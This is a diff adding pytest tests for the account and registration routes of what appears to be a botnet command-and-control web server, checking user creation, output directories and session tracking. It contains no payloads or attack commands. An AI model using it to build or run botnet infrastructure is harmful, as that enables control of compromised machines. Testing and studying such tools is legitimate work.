@@ -1,7 +1,11 @@
+import os
 import pytest
+import shutil
 from flask_login import current_user
 from buildyourownbotnet import c2
+from buildyourownbotnet.core.dao import user_dao
 from buildyourownbotnet.server import SessionThread
+from buildyourownbotnet.models import db, bcrypt, User
 from ..conftest import app_client, new_user, login, logout
 
 # Main routes
@@ -229,3 +233,55 @@ def test_shell_wrong_session_owner(app_client, new_user, new_session):
     # run test
     response = app_client.get('/shell', query_string={'session_uid': new_session.uid})
     assert response.status_code == 302
+
+def test_account(app_client, new_user):
+    """
+    Given an authenticated user,
+    when a GET request is sent to /account,
+    check that a HTTP 200 response is returned and they are directed to the account page.
+    """
+    login(app_client, new_user.username, 'test_password') 
+    response = app_client.get('/account')
+    assert response.status_code == 200
+
+def test_register(app_client):
+    """
+    Given an application instance,
+    when a POST request is sent to /register with valid form data,
+    check that the user is added to the database correctly,
+    the user directories are created in the filesystem properly,
+    and the username is added to the c2 session hashmap properly.
+    """
+ 
+    test_username = 'test_user'
+    test_password = 'test_password'
+    try:
+        res = app_client.post('/register', 
+                data = {
+                    'username': test_username,
+                    'password': test_password,
+                    'confirm_password': test_password 
+                },
+                follow_redirects=True, 
+                headers = {"Content-Type":"application/x-www-form-urlencoded"})
+    except Exception as e:
+        pytest.fail("user_dao.add_user returned exception: " + str(e))
+
+    # check user was created in database correctly
+    user = user_dao.get_user(username=test_username)
+    assert user.username == test_username
+    assert bcrypt.check_password_hash(user.password, test_password)
+
+    # check user directory created in filesystem
+    user_dir = os.path.join('./buildyourownbotnet/output/', test_username)
+    assert os.path.isdir(user_dir)
+
+    # check user added to c2 session hashmap
+    assert test_username in c2.sessions
+
+    # clean up
+    User.query.delete()
+    db.session.commit()
+
+    # clean up filesystem
+    shutil.rmtree(user_dir)
